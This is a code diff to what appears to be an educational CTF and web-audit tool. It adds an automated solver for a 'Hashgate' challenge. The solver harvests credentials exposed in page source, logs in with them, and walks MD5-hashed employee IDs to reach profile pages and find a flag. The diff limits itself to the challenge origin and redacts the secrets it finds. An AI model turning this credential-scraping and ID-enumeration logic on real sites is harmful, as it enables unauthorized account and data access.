@@ -33,12 +33,13 @@ import sys
 import http.client
 import secrets
 import codecs
+import hashlib
 import html as html_lib
 from datetime import datetime, timezone
 from email.utils import parsedate_to_datetime
 from urllib.parse import urlsplit, urlencode, urljoin, quote
 
-__version__ = "2.19.0"
+__version__ = "2.20.0"
 
 # --------------------------------------------------------------------------- #
 DEFAULT_FLAG_PATTERNS = [
@@ -1076,6 +1077,113 @@ _STATIC_GUIDANCE = {
 }
 
 
+def _hashgate_source_credentials(sources: list[tuple[str, str]]) -> tuple[str | None, str | None]:
+    """Return challenge credentials only when both are explicitly present in fetched source."""
+    for _url, source in sources:
+        email_match = re.search(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}", source)
+        user_match = re.search(r"(?i)(?:username|user|email)\s*['\"]?\s*[:=]\s*['\"]([^'\"]{2,160})['\"]", source)
+        password_match = re.search(r"(?i)(?:password|passwd|pass)\s*['\"]?\s*[:=]\s*['\"]([^'\"]{1,160})['\"]", source)
+        identity = email_match.group(0) if email_match else (user_match.group(1) if user_match else None)
+        if identity and password_match:
+            return identity, password_match.group(1)
+    # Credentials are often in adjacent source fragments or separate declarations.
+    all_source = "\n".join(body for _url, body in sources)
+    identity_match = re.search(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}", all_source)
+    password_match = re.search(r"(?i)(?:password|passwd|pass)\s*['\"]?\s*[:=]\s*['\"]([^'\"]{1,160})['\"]", all_source)
+    if identity_match and password_match:
+        return identity_match.group(0), password_match.group(1)
+    return None, None
+
+
+def solve_hashgate(client, origin, recon, steps, bodies, record, flag_patterns) -> dict:
+    """Use source-disclosed CTF credentials, then test the hint-bounded MD5 ID range."""
+    res = _base_result(origin, "Hashgate", "hashgate", recognized=True)
+    res["steps"] = steps
+    sources = [(origin, recon["html"])]
+    checked = []
+    for resource_url in _page_resources(recon["html"], origin):
+        try:
+            response = client.request("GET", resource_url, max_body=MAX_BODY)
+            # Credentials found in source are never copied into the student-facing trace.
+            record(response, ["قراءة ملف مصدر مرتبط بالصفحة بحثًا عن بيانات دخول تجريبية منشورة في الشيفرة."])
+            sources.append((resource_url, response["body"]))
+            checked.append(urlsplit(resource_url).path)
+        except (OSError, http.client.HTTPException, ValueError):
+            continue
+
+    identity, password = _hashgate_source_credentials(sources)
+    res["discovered"] = {"source_files_checked": checked, "employee_id_range": [3000, 3019],
+                         "tested_ids": [], "credentials_found_in_source": bool(identity and password)}
+    if identity and password:
+        form = next((item for item in recon.get("forms", []) if item.get("method") == "POST" and
+                     any("pass" in field.lower() for field in item.get("fields", [])) and
+                     any(any(tag in field.lower() for tag in ("email", "user")) for field in item.get("fields", []))), None)
+        fetch = recon.get("login_fetch")
+        login_fields = form.get("fields", []) if form else (fetch.get("fields", []) if fetch else [])
+        if login_fields:
+            values = _hidden_form_values(recon["html"])
+            for field in login_fields:
+                low = field.lower()
+                if "pass" in low:
+                    values[field] = password
+                elif "email" in low or "user" in low:
+                    values[field] = identity
+            try:
+                if form:
+                    login_url = urljoin(origin, form.get("action") or "")
+                    if urlsplit(login_url).netloc != urlsplit(origin).netloc:
+                        raise ValueError("login form points outside the challenge origin")
+                    response = client.request("POST", login_url, urlencode(values))
+                else:
+                    login_url = urljoin(origin, fetch.get("path", ""))
+                    if urlsplit(login_url).netloc != urlsplit(origin).netloc:
+                        raise ValueError("login endpoint points outside the challenge origin")
+                    fields = {k.lower(): v for k, v in values.items()}
+                    payload = {field: (password if "pass" in field.lower() else identity)
+                               for field in login_fields}
+                    response = client.request("POST", login_url, json.dumps(payload),
+                                              {"Content-Type": "application/json"})
+                # Avoid returning an echoed source credential in a response preview.
+                record(_redact_response_body(response, [identity, password]),
+                       ["أرسل صقر بيانات الدخول التي عثر عليها في مصدر التحدي إلى نموذج الدخول المكتشف؛ أخفى القيم من السجل."])
+                res["discovered"]["login_status"] = response["status"]
+            except (OSError, http.client.HTTPException, ValueError) as exc:
+                res["warnings"].append("تعذر إرسال بيانات الدخول إلى نموذج التحدي المكتشف: " + str(exc)[:160])
+        else:
+            res["warnings"].append("عُثر على بيانات دخول في المصدر لكن لم يظهر نموذج/طلب دخول مناسب، لذلك لم تُرسل البيانات.")
+        # Also scrub source snippets because the root response is recorded before this analyzer runs.
+        for step in steps:
+            snippet = step.get("body_snippet", "")
+            for secret in (identity, password):
+                if secret:
+                    snippet = snippet.replace(secret, "[مخفي]")
+            step["body_snippet"] = snippet
+    else:
+        res["warnings"].append("لم يستطع صقر استخراج زوج بريد/كلمة مرور من الشيفرة المرتبطة؛ لن يجرّب كلمات مرور تخمينية.")
+
+    # Hint bounds this challenge to about twenty employees; test only the known 3000–3020 range.
+    for user_id in range(3000, 3020):
+        hashed_id = hashlib.md5(str(user_id).encode("ascii")).hexdigest()
+        profile_url = urljoin(origin, "/profile/user/" + hashed_id)
+        try:
+            response = client.request("GET", profile_url, max_body=MAX_BODY)
+            record(response, [f"اختبار معرّف الموظف {user_id}: MD5 للمعرّف ثم GET لمسار الملف الشخصي."])
+        except (OSError, http.client.HTTPException, ValueError) as exc:
+            res["warnings"].append(f"توقف اختبار معرّفات الموظفين عند {user_id}: {str(exc)[:140]}")
+            break
+        res["discovered"]["tested_ids"].append(user_id)
+        flag, source = extract_flag([(f"Hashgate profile for employee {user_id}", response["body"])], flag_patterns)
+        if flag:
+            res["success"], res["flag"], res["flag_source"] = True, flag, source
+            res["discovered"]["admin_employee_id"] = user_id
+            res["discovered"]["admin_profile_hash"] = hashed_id
+            res["explanation_ar"].append("اكتشف صقر رقم الموظف من النطاق المحدود الذي يبرره تلميح التحدي، وحسب MD5 محليًا ثم وجد العلم في صفحة الملف الشخصي.")
+            return res
+    res["explanation_ar"].append("يفحص Hashgate معرّفات الموظفين المحدودة عبر MD5، ولا يجرب كلمات مرور أو مسارات عشوائية.")
+    res["warnings"].append("لم يظهر العلم ضمن صفحات الملفات الشخصية المختبرة. تحقق من أن المثيل متاح وأن تسجيل الدخول نجح.")
+    return res
+
+
 def detect_named_challenge(challenge_text: str | None):
     text = challenge_text or ""
     # Challenge text is pasted with its title on a standalone first line. Match
@@ -1857,6 +1965,8 @@ def run_audit(url: str,
 
     named = detect_named_challenge(challenge_text)
     if named:
+        if named[1] == "hashgate":
+            return solve_hashgate(client, origin, recon, steps, bodies, record, flag_patterns)
         if named[1] == "intro-to-burp":
             return solve_intro_to_burp(client, origin, recon, steps, bodies, record, flag_patterns)
         if named[1] == "local-authority":
